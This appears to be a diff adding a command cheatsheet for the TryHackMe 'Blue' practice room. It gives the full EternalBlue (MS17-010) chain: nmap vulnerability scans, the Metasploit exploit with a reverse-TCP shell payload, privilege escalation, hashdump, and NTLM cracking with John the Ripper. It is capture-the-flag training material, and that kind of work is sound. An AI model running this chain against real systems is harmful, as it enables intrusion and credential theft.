@@ -1,0 +1,119 @@
+# 🧠 TryHackMe “Blue” — Command Cheatsheet
+_A quick reference for all commands used in the EternalBlue (MS17-010) exploitation walkthrough._
+
+---
+
+## 🕵️ Reconnaissance
+
+### Basic Port Scan
+```bash
+nmap -p 0-1000 <TARGET_IP>
+Full Port + Version + Vulnerability Scan
+bash
+Copy code
+nmap -p 0-65535 -sV --script vuln <TARGET_IP>
+Save Results to File
+bash
+Copy code
+nmap -p 0-65535 -sV -oN nmap_scan.txt <TARGET_IP>
+⚙️ Exploitation (Metasploit Framework)
+Start Metasploit
+bash
+Copy code
+msfconsole
+Search for EternalBlue Module
+bash
+Copy code
+search ms17-010
+Load the Exploit
+bash
+Copy code
+use exploit/windows/smb/ms17_010_eternalblue
+Show and Configure Options
+bash
+Copy code
+show options
+set payload windows/x64/shell/reverse_tcp
+set RHOSTS <TARGET_IP>
+set LHOST <YOUR_IP>
+show options
+Run the Exploit
+bash
+Copy code
+run
+💻 Post-Exploitation
+List Active Sessions
+bash
+Copy code
+sessions -l
+Interact with a Session
+bash
+Copy code
+sessions -i <id>
+Upgrade to Meterpreter (if you have a regular shell)
+bash
+Copy code
+search shell_to_meterpreter
+use post/multi/manage/shell_to_meterpreter
+show options
+set SESSION <session_num>
+run
+Privilege Escalation
+bash
+Copy code
+meterpreter > getsystem
+Check Current Privileges
+bash
+Copy code
+meterpreter > getuid
+meterpreter > whoami
+List Running Processes
+bash
+Copy code
+meterpreter > ps
+Migrate to a Stable Process
+bash
+Copy code
+meterpreter > migrate <pid>
+🔐 Credential Access
+Dump Password Hashes
+bash
+Copy code
+meterpreter > hashdump
+Save Hash to File (on attacker)
+bash
+Copy code
+echo "NTLM_HASH_HERE" > hash.txt
+Crack NTLM Hash Using John the Ripper
+bash
+Copy code
+john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+📁 File Navigation & Flag Collection
+bash
+Copy code
+meterpreter > pwd
+meterpreter > ls
+meterpreter > cd C:\
+meterpreter > dir
+meterpreter > cat flag1.txt
+meterpreter > cd Windows\System32\Config
+meterpreter > cat flag2.txt
+meterpreter > cd Users\<username>\Documents
+meterpreter > cat flag3.txt
+🧩 Miscellaneous Useful Commands
+Background the Current Session
+bash
+Copy code
+Ctrl + Z
+Check System Info
+bash
+Copy code
+meterpreter > sysinfo
+Run Help
+bash
+Copy code
+meterpreter > help
+⚠️ Disclaimer
+This cheatsheet is for educational and authorized lab use only (e.g., TryHackMe “Blue” room).
+Do not execute these commands on systems you don’t own or have explicit permission to test.
+
